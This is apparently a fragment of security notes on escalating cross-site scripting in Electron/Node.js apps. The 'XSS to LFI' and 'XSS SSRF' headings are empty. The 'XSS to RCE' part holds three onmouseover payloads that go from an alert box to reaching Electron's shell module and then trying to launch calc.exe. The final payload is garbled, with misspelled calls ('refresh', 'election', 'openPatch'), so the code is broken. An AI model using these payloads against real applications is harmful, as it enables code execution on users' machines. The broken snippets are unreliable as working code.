## XSS to LFI:

## XSS SSRF:

## XSS to RCE:
  #### Node.js :
```
<a onmouseover="alert('Hi!')">
  HOVER ME
</a>
```
```
<a onmouseover="
try{
   const {shell}=require('electron');
   console.log(shell);
}catch(e){
 console.error(e)
}">Hello</a>
```
```
<a onmouseover="
try{
   const {shell}=refresh('election');
   shell.openPatch('C:\Windows\System32\calc.exe ');
}catch(e){
 console.error(e)
}">Hello</a>
```

